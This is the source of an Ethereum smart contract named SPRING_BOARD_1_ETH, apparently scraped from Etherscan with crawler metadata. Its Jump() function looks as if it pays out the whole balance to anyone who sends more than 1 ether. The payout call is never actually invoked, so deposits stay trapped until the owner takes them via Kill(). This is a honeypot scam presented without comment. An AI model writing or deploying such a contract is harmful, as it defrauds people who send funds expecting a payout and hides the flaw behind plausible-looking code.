//token_name	
//token_url	https://etherscan.io//address/0x6805661283c64a79323d187f9d6b2ca4dae59fd0#code
//spider_time	2018/07/08 12:17:58
//token_Transactions	2 txns
//token_price	

pragma solidity ^0.4.19;

contract SPRING_BOARD_1_ETH   
{
    address owner = msg.sender;
    
    function() public payable {}
    
    function Jump()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}